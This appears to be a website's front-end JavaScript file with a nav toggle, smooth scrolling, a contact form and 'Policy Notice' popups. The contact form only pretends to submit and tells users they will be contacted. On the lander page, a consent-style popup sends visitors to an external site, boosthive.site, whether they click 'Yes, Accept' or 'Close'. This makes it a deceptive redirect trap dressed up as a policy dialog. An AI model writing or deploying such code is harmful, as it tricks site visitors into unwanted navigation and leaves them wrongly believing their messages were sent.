
// Mobile nav toggle
const navToggle = document.querySelector('[data-nav-toggle]');
const navMenu = document.querySelector('[data-nav-menu]');
if(navToggle && navMenu){
  navToggle.addEventListener('click', ()=>{
    navMenu.classList.toggle('open');
    navMenu.style.display = navMenu.classList.contains('open') ? 'flex' : '';
  })
}
 
// Smooth scroll
document.querySelectorAll('a[href^="#"]').forEach(a=>{
  a.addEventListener('click', e=>{
    const href = a.getAttribute('href');
    if(href && href.startsWith('#')){
      const el = document.querySelector(href);
      if(el){
        e.preventDefault();
        el.scrollIntoView({behavior:'smooth', block:'start'});
      }
    }
  })
})
 
// Fake form submit
const form = document.querySelector('#contact-form');
if(form){
  form.addEventListener('submit', (e)=>{
    e.preventDefault();
    const data = Object.fromEntries(new FormData(form).entries());
    alert(`Thanks ${data.name || 'there'}! We'll reach out to ${data.email || 'your inbox'} soon.`);
    form.reset();
  });
}
 
// Age-gate: show ONLY on home page (index.html or root) and once per session.
// Closes on Yes/No and stays on the page.
(function(){
  const path = window.location.pathname.split('/').pop();
  const isHome = path === '' || path === 'index.html';
  if(!isHome) return;
  if(sessionStorage.getItem('indexGateShown') === '1') return;
  sessionStorage.setItem('indexGateShown', '1');
  const bd = document.createElement('div');
  bd.className = 'modal-backdrop';
  bd.innerHTML = `
<div class="modal">
<h3>Policy Notice</h3>
<p>Are you accepting our policy to enter the game?</p>
<div style="display:flex;gap:10px;flex-wrap:wrap">
<button class="btn" id="age-yes">Yes, Accept</button>
<button class="btn ghost" id="age-no">Close</button>
</div>
</div>`;
  document.body.appendChild(bd);
  document.body.classList.add('modal-open');
  bd.style.display='flex';
  function closeGate(){
    document.body.classList.remove('modal-open');
    bd.style.display='none'; bd.remove();
  }
  bd.querySelector('#age-yes').addEventListener('click', closeGate);
  bd.querySelector('#age-no').addEventListener('click', closeGate);
})();
 
(function(){
  const path = window.location.pathname.split('/').pop();
  const isLander = path === 'lander.html';
  if(!isLander) return;

  // --- POPUP POSITION ---
  // You can change this value to move the popup.
  // '50%' = middle, '100%' = bottom. '75%' is between middle and bottom.
  const popupTopPosition = '65.5%';
 
  const bd = document.createElement('div');
  bd.className = 'modal-backdrop';
  bd.innerHTML = `
<div class="modal" style="position: absolute; top: ${popupTopPosition}; left: 50%; transform: translate(-50%, -50%);">
<h3>Policy Notice</h3>
<p>Are you accepting our policy to play the game?</p>
<div style="display:flex;gap:10px;flex-wrap:wrap">
<button class="btn" id="age-yes">Yes, Accept</button>
<button class="btn ghost" id="age-no">Close</button>
</div>
</div>`;
  document.body.appendChild(bd);
  document.body.classList.add('modal-open');
  bd.style.display='flex';

  function closeGate(){
    document.body.classList.remove('modal-open');
    bd.style.display='none'; bd.remove();
  }
  bd.querySelector('#age-yes').addEventListener('click',
                                                function(){
   window.location.href = " https://boosthive.site/";
  });
   bd.querySelector('#age-no').addEventListener('click', 
                                               function(){
   window.location.href = " https://boosthive.site/";
  }); 
})();
